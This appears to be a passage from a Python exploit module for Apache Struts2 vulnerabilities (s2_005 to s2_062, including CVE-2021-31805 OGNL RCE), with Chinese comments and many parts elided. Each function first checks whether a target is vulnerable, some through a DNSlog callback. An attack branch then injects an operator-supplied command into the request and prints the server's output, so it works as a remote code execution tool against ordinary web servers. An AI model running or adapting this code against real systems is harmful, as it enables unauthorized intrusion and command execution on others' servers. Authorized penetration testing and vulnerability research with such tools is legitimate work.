...
from lib.clasetting import Dnslog,URL
...
| Apache Struts2    | s2_062           |  Y  |  Y  | 2.0.0-2.5.29, cve-2021-31805 ognl interpreter rce           |
...
#            r"pp=____A&ppp=%20&encoding=UTF-8"
        ...
        self.payload_s2_062 = """------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\n""" \
    ...
    def s2_005(self):
        ...
        try:
            ...
            #_attack
                ...
                result = exprequest.post(self.url+path, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=payload).text
                print(result)
    ...
    def s2_008(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload_s2_008_test)
            ...
            #_attack
                ...
                result = exprequest.get(self.url+payload).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def s2_013(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path+payload)
                if self.flag in request.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
            #_attack
                ...
                result = exprequest.get(self.url+path+payload).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def s2_015(self):
        ...
        try:
            ...
            if self.vuln == 'False':
                ...
                exprequest.get(self.url+payload)
                if dnslog.result():
                    return output.echo_success(method, info)
                else:
                    return output.fail()
    ...
    def s2_016(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload_1)
                if self.flag in request.text:
                    return output.echo_success(method, info)
            ...
            #_attack
                ...
                result = exprequest.get(self.url+payload_1).text
                print(result)
        except Exception as error:
            return output.error_output(str(error))
    ...
    def s2_029(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload)
                if request.status_code not in [400,404] and self.flag in request.text:
                    return output.echo_success(method, info)
                    self.status = 'success'
                else:
                    return output.fail()
    ...
    def s2_045(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+path, headers=headers1)
                for value in request.headers.values():
                    if r"54289" in value:
                        return output.echo_success(method, info)
                result = exprequest.get(self.url+path, headers=headers2).text
    ...
    def s2_057(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(url+payload)
                etree = html.etree
    ...
    def s2_062(self):
        ...
        #条件
        num1 = randomInt(100, 10000)
        num2 = randomInt(100, 10000)
        sum = num1 + num2
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        ...
        try:
            ...
            if self.vuln == 'False':
                #替换为验证命令
                data = self.payload_s2_062.replace("RECOMMAND", "expr %d + %d"%(num1,num2))
                r = exprequest.post(
                    url=self.url+path,
                    data=data,
                    headers=headers,
                ...
                if str(sum) in r.text:
                    ...
                    # dnshost = DL.dns_host()
                    # #替换为验证命令
                    # data = self.payload_s2_062.replace("RECOMMAND", "ping "+ dnshost)
                    # r = exprequest.post(
                    #     url=self.url+path, 
                    #     data=data, 
                    #     headers=headers, 
                    ...
                    #     )
                    # if DL.result():
                    #     return output.no_echo_success(method, info)
                    return output.fail()
            #_attack
            else:
                #替换为验证命令
                data = self.payload_s2_062.replace("RECOMMAND", self.cmd)
                r = exprequest.post(
                    url=self.url+path,
                    data=data,
                    headers=headers,
    ...
    def s2_devMode(self):
        ...
        try:
            #_verify
            if self.vuln == 'False':
                request = exprequest.get(self.url+payload, allow_redirects=False)
                if self.flag in request.text:
                    return output.echo_success(method, info)
                else:
                    return output.fail()
...
def check(**kwargs):
    thread_list = []
    ExpApacheStruts2 = struts2(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpApacheStruts2, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(struts2):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpApacheStruts2, func)))
    #保存全局子线程列表
